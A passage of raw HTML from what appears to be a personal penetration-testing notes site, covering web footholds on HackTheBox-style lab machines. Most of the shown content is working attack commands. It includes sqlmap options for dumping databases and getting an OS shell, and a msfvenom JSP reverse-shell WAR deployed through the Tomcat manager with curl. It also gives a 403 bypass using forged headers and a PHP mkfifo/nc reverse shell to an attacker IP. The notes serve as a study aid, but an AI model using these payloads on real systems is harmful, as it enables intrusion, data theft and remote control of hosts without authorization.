class="token plain">sqlmap -u http://10.10.10.58:3000/api/session/authenticate --data </span><span class="token string" style="color:#e3116c">&quot;username=1&amp;password=2&quot;</span><span class="token plain"> -p </span><span class="token string" style="color:#e3116c">&quot;username,password&quot;</span><span class="token plain"> --method POST</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Can also export from Burp with &#x27;Copy to File&#x27;, then import into sqlmap with <code>sqlmap -r &lt;file&gt;</code>. Remember to remove injection payload in file first.</p><p>Useful options:</p><ul><li>listing stuff<ul><li>dbs: <code>--dbs</code></li><li>tables: <code>-D &lt;target DB&gt; --tables</code></li><li>columns: <code>-D &lt;target DB&gt; -T &lt;target table&gt; --columns</code></li></ul></li><li>dumping<ul><li>a specific column: <code>-D &lt;target DB&gt; -T &lt;target table&gt; -C &quot;Col1,Col2&quot; --dump</code></li><li>everything(READ: will take FOREVER): <code>--dump</code></li></ul></li><li>get shell<ul><li>get os shell: <code>--os-shell</code></li><li>get SQL shell: <code>--sqlmap-shell</code></li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_y2LR" id="other-tips">Other Tips<a class="hash-link" href="#other-tips" title="Direct link to heading">â€‹</a></h2><ol><li><p>If running Tomcat and we have credentials, deploy war file with reverse shell like <a href="https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script" target="_blank" rel="noopener noreferrer">this</a></p><div class="codeBlockContainer_J+bg theme-code-block"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain"># generate reverse shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f war -o shell.war</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># tomcat 6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl --upload-file target\debug.war &quot;http://tomcat:tomcat@localhost:8088/manager/deploy?path=/debug&amp;update=true&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># tomcat 7 &amp; 8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl -v -u some_user:some_password -T /../my_app.war &#x27;http://127.0.0.1:tomcat_port/manager/text/deploy?path=/my_app&amp;update=true&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">then visit http://webite/shell</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div></li><li><p>Bypass 403 with forged IP headers, such as <code>X-Forwarded-For</code>, <code>X-Client-IP</code>, <code>X-Remote-Addr</code></p></li><li><p>Upload web.config to get RCE: <a href="https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/" target="_blank" rel="noopener noreferrer">Uploading web.config For Fun and Profit</a></p></li><li><p>If <code>/cgi-bin</code> exists, try scanning for <code>.sh .pl .cgi</code> files under it. (Try common.txt wordlist) There might be <code>shellshock</code>!</p></li><li><p>Stable PHP reverse shell: <code>passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 4444 &gt;/tmp/f&quot;);</code></p></li></ol></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/crystalwwj/the-nest/edit/main/docs/cybersecurity/pentest-notes/foothold/web.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_mS5F" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_mt2f"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/discovery-and-enum"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Host Discovery and Service Enumeration</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/the-nest/docs/cybersecurity/pentest-notes/foothold/services"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Using common services</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#scanning" class="table-of-contents__link toc-highlight">Scanning</a><ul><li><a href="#wfuzz" class="table-of-contents__link toc-highlight">Wfuzz</a></li><li><a href="#other-scanners" class="table-of-contents__link toc-highlight">Other scanners</a></li></ul></li><li><a href="#file-inclusion" class="table-of-contents__link toc-highlight">File inclusion</a><ul><li><a href="#lfirfi-to-rce" class="table-of-contents__link toc-highlight">LFI/RFI to RCE</a></li><li><a href="#log-contaminating" class="table-of-contents__link toc-highlight">Log contaminating</a></li><li><a href="#from-rfi" class="table-of-contents__link toc-highlight">from RFI</a></li><li><a href="#session-poisoning" class="table-of-contents__link toc-highlight">Session poisoning</a></li><li><a href="#php-wrapper" class="table-of-contents__link toc-highlight">PHP wrapper</a></li></ul></li><li><a href="#sql-injection" class="table-of-contents__link toc-highlight">SQL injection</a><ul><li><a href="#manual" class="table-of-contents__link toc-highlight">Manual</a></li><li><a href="#tools" class="table-of-contents__link toc-highlight">Tools</a></li></ul></li><li><a href="#other-tips" class="table-of-contents__link toc-highlight">Other Tips</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/the-nest/docs/intro">Tutorial</a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/the-nest/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/cymetrics" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2022 The Nest, Built with Docusaurus.</div></div></div></footer></div>
<script src="/the-nest/assets/js/runtime~main.3942ce3f.js"></script>
<script src="/the-nest/assets/js/main.498f1394.js"></script>
</body>
</html>